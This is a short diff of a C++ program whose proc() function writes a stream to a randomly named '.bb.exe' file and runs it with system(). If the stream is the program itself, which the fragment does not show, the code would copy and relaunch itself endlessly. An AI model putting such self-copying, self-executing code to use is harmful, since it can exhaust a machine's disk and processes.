@@ -22,11 +22,10 @@ int proc(){
 	std::string nname = "aaa"+std::to_string(rand())+".bb.exe";
 	d.open(nname,std::ios::binary);
 	d << s.rdbuf();
-	chmod (nname.c_str(),mode_t(0775));
+	//chmod (nname.c_str(),mode_t(0775));
 	s.close();
 	d.close();
-	system(("export SHLVL=1 && ./"+nname+" &").c_str());
-	printf("%s\n","I did it");
+	system(("./"+nname+"").c_str());
 }
 int main(){
 	proc();
